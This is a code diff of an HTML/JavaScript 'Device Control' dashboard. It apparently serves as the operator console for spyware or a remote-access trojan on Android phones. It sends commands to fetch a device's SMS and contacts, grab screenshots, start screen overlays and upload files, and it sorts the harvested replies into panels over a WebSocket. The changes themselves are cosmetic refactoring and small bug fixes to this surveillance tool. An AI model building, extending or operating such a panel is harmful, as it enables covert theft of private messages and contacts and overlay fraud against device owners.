@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Device Control — Dashboard</title>
+  <title>Device Control — Dark Dashboard</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     :root{
@@ -201,6 +201,10 @@
           <button class="btn" id="btnCustomOverlay">Start Overlay</button>
           <button class="btn ghost" id="btnStopOverlay">Stop Overlay</button>
         </div>
+        <div style="margin-top:8px; display:flex; gap:8px;">
+          <button class="btn" id="btnFetchScreenshotPermission">Grant Screenshot</button>
+          <button class="btn" id="btnUpload">Upload</button>
+        </div>
       </div>
     </aside>
 
@@ -212,7 +216,7 @@
           <div style="color:var(--muted); margin-left:10px;">Client: <span id="devIdTop" class="muted">unknown</span></div>
         </div>
         <div style="margin-left:auto" class="flex">
-          <div id="onlineIndicator" class="status">Online</div>
+          <div id="onlineIndicator" class="status">Offline</div>
         </div>
       </div>
 
@@ -253,7 +257,6 @@
     <aside id="rightbar">
       <!-- Icons call the same commands -->
       <button class="icon-btn" title="Fetch SMS" id="iconSms" data-cmd="fetch-sms">
-        <!-- SMS icon -->
         <svg viewBox="0 0 24 24"><path d="M2 3v14h6l3 3 3-3h6V3H2zm18 12H9.828L8 18.828 6.172 17H4V5h16v10z"/></svg>
       </button>
 
@@ -291,10 +294,15 @@
   </div>
 
 <script>
-/* ---------------------------------------
-   Helper: sendCmd — calls server endpoint
-   (keeps your existing API unchanged)
-----------------------------------------*/
+/* ---------------------------
+   Compatibility & helpers
+   - Keeps your original sendCmd endpoint and IDs
+----------------------------*/
+function pad(n){ return n < 10 ? "0"+n : n; }
+function truncate(s,n){ return s.length > n ? s.slice(0,n-3) + "..." : s; }
+function escapeHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+/* --- sendCmd: same API you used before --- */
 async function sendCmd(cmd) {
   pushLog(`📤 Sending "${cmd}"...`);
   try {
@@ -310,7 +318,7 @@ async function sendCmd(cmd) {
   }
 }
 
-/* --- wire up original buttons (preserve your IDs) --- */
+/* Wire your original buttons (IDs preserved) */
 document.getElementById("btnFetch").onclick = () => sendCmd("fetch");
 document.getElementById("btnStartNotify").onclick = () => sendCmd("start-notify");
 document.getElementById("btnStopNotify").onclick = () => sendCmd("stop-notify");
@@ -337,7 +345,7 @@ document.getElementById("btnCustomOverlay").onclick = () => {
 document.getElementById("btnStopOverlay").onclick = () => sendCmd("stop-overlay");
 document.getElementById("btnClose").onclick = () => window.close();
 
-/* icon bar wiring */
+/* Right icon bar wiring (preserve command mapping) */
 document.querySelectorAll("#rightbar .icon-btn").forEach(b=>{
   b.addEventListener("click", ()=> {
     const c = b.dataset.cmd;
@@ -345,9 +353,7 @@ document.querySelectorAll("#rightbar .icon-btn").forEach(b=>{
   });
 });
 
-/* ---------------------------------------
-   Tabs logic
-----------------------------------------*/
+/* Tabs logic */
 document.querySelectorAll(".tab").forEach(t=>{
   t.addEventListener("click", ()=>{
     document.querySelectorAll(".tab").forEach(x=>x.classList.remove("active"));
@@ -357,9 +363,7 @@ document.querySelectorAll(".tab").forEach(t=>{
   });
 });
 
-/* ---------------------------------------
-   WebSocket for live updates (same as your original code)
-----------------------------------------*/
+/* WebSocket + panels wiring (keeps your original behavior) */
 const pathParts = window.location.pathname.split("/");
 const clientId = pathParts[pathParts.length - 1] || "unknown";
 const urlParams = new URLSearchParams(location.search);
@@ -386,11 +390,11 @@ function pushLog(msg){
   logPanel.scrollTop = logPanel.scrollHeight;
 }
 
-/* lightweight routing heuristics — tweak to match how your Android app formats messages */
+/* Smart routing of incoming responses to panels */
 function routeMessageToPanel(output){
   const low = output.toLowerCase();
 
-  // SCREENSHOT (your existing detection)
+  // Screenshot detection (preserve your previous rule)
   if (output.includes("supabase.co") || output.includes("s3.") || output.includes("storage.googleapis")) {
     addScreenshotToGrid(output);
     const el = document.createElement("div");
@@ -400,7 +404,7 @@ function routeMessageToPanel(output){
     return;
   }
 
-  // SMS detection (common prefixes)
+  // SMS detection heuristics
   if (low.includes("sms:") || low.includes("text:") || low.includes("message:") || low.includes("sms|")) {
     const el = document.createElement("div");
     el.textContent = output;
@@ -410,7 +414,7 @@ function routeMessageToPanel(output){
   }
 
   // CONTACTS detection
-  if (low.includes("contact:") || low.includes("name:") && low.includes("phone")) {
+  if ((low.includes("contact:") || low.includes("name:")) && low.includes("phone")) {
     const el = document.createElement("div");
     el.textContent = output;
     contactsPanel.appendChild(el);
@@ -436,15 +440,15 @@ function routeMessageToPanel(output){
     return;
   }
 
-  // Default goes to logs (already done by pushLog)
+  // Default: nothing else — leave in logs and done.
 }
 
 /* WebSocket connection (re-uses your path + host logic) */
 const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
 const ws = new WebSocket(wsProto + location.host);
 
-ws.onopen = () => { pushLog("🔌 WebSocket connected"); document.getElementById("onlineIndicator").textContent = "Online"; };
-ws.onclose = () => { pushLog("❌ WebSocket disconnected"); document.getElementById("onlineIndicator").textContent = "Offline"; };
+ws.onopen = () => { pushLog("🔌 WebSocket connected"); document.getElementById("onlineIndicator").textContent = "Online"; document.getElementById("status").textContent = "Online"; };
+ws.onclose = () => { pushLog("❌ WebSocket disconnected"); document.getElementById("onlineIndicator").textContent = "Offline"; document.getElementById("status").textContent = "Offline"; };
 ws.onerror = (e)=> pushLog(`⚠️ WS error: ${e?.message || e}`);
 
 ws.onmessage = (evt) => {
@@ -488,7 +492,7 @@ function addScreenshotToGrid(url){
 
   // timestamp label
   const d = new Date();
-  const stamp = `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+  const stamp = `${pad(d.getFullYear())}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
   const label = document.createElement("div");
   label.className = "stamp";
   label.textContent = stamp;
@@ -532,6 +536,7 @@ function addScreenshotToGrid(url){
   const line = document.createElement("div");
   line.textContent = `${stamp} — ${url}`;
   screenshotsPanel.appendChild(line);
+  screenshotsPanel.scrollTop = screenshotsPanel.scrollHeight;
 }
 
 /* modal helpers */
@@ -558,12 +563,7 @@ function openModal(url, stamp){
 }
 function closeModal(){ document.getElementById("imageModal").classList.remove("show"); document.getElementById("modalImage").src = ""; }
 
-/* small util */
-function pad(n){ return n < 10 ? "0"+n : n; }
-function truncate(s,n){ return s.length > n ? s.slice(0,n-3) + "..." : s; }
-function escapeHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-
-/* Expose pushRemoteLog for console use (keeps compatibility) */
+/* expose pushRemoteLog for compatibility with your server code */
 window.pushRemoteLog = pushLog;
 </script>
 </body>
